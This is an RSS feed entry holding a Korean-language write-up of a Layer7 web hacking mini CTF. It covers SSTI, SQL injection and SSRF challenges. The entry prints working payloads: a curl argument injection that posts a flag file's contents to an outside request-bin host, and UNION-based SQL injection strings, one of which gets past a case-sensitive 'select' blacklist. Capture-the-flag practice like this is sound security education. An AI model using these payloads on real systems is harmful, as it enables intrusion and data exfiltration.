@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web Hacking on T43W00</title><link>https://t43w00.netlify.app/tags/web-hacking/</link><description>Recent content in Web Hacking on T43W00</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 07 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://t43w00.netlify.app/tags/web-hacking/index.xml" rel="self" type="application/rss+xml"/><item><title>Layer7 Web Hacking mini CTF | Write-up</title><link>https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/</link><pubDate>Thu, 07 Aug 2025 00:00:00 +0000</pubDate><guid>https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/</guid><description>&lt;h2 id="rednose-u"&gt;Rednose U
+&lt;/h2&gt;&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image1.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image1_hu_2f6c65c607bda05e.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image1_hu_cca6a56905e2cee0.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;
+&lt;code&gt;SSTI&lt;/code&gt;로 &lt;code&gt;JWTKey&lt;/code&gt;를 얻을 수 있어서 대시보드에 접속할 수 있다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image2.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image2_hu_f18497a232cb3745.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image2_hu_6003140284c364c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;
+&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image3.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image3_hu_c687d4e5f742f67c.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image3_hu_3d576bafe74f30ca.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;&lt;/p&gt;
+&lt;p&gt;대시보드를 보면 &lt;code&gt;/api/metar&lt;/code&gt;에서 &lt;code&gt;airport&lt;/code&gt; 인자로 특정 주소에서 값을 가져오는 것으로 보이는데, 코드를 보면 &lt;code&gt;curl&lt;/code&gt;을 실행하는 것을 확인할 수 있다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image4.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image4_hu_73b4d55e8b5d085d.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image4_hu_8d73434a3c0c97e3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;&lt;/p&gt;
+&lt;p&gt;그래서 플래그를 읽어서 리퀘스트 빈에 보내도록 하였다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://211.177.227.113:65303/api/metar?airport=-X%20POST%20https://cqymucy.request.dreamhack.games%20-d%20%22$(cat%20flag_qaiu.txt)%22&lt;/code&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id="w2"&gt;W2
+&lt;/h2&gt;&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image5.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image5_hu_9ca36a48945aa969.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image5_hu_a5cd069855e54fa5.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;
+&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image6.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image6_hu_c68d94257b0c06d1.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image6_hu_1b3a89429ac8942b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;
+&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image7.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image7_hu_9c243204c7ddca4.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image7_hu_34e5c88f1ef5950e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;fstring&lt;/code&gt;으로 쿼리문을 처리하기 때문에 &lt;code&gt;SQLI&lt;/code&gt; 취약점이 터진다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flags&lt;/code&gt; 테이블에 있는 플래그를 &lt;code&gt;UNION&lt;/code&gt; 명령을 통해 출력하도록 하였다. 블랙리스트에 있는 &lt;code&gt;select&lt;/code&gt;는 소문자만 막기 때문에 대문자로 우회 가능하다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://211.177.227.113:65304/profile?id=1234%20UNION%20SELECT%20%27flag%27,flag_value,%27%27,%27secret%27%20FROM%20flags%20WHERE%20flag_name=%27main_flag%27--&lt;/code&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id="srs"&gt;SRS
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;L7_WH_CTF/SRS/for_user via  v3.13.5
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;❯ cat flag_server.py | grep Layer7{
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;flag&amp;#39;: &amp;#39;Layer7{ssrf_easy}&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;문제 파일에 플래그가 하드코딩 되어있다.&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id="t야"&gt;T야?
+&lt;/h2&gt;&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image8.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image8_hu_4ead32838cf89ea0.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image8_hu_67455d9fed28ca43.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;&lt;/p&gt;
+&lt;p&gt;여기도 &lt;code&gt;fstring&lt;/code&gt;으로 쿼리문을 처리해서 &lt;code&gt;SQLI&lt;/code&gt;가 터지는 걸 알 수 있다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;img src="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image9.png"
+width="1910"
+height="1031"
+srcset="https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image9_hu_4843075cc1ebadf0.png 480w, https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/image9_hu_d5052347a2d817da.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flags&lt;/code&gt; 테이블에서 플래그를 가져와 &lt;code&gt;username&lt;/code&gt;에 &lt;code&gt;UNION&lt;/code&gt; 해줬다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;' UNION SELECT 1, flag_value, 'dummy', 'admin' FROM flags --&lt;/code&gt;&lt;/p&gt;</description></item></channel></rss>
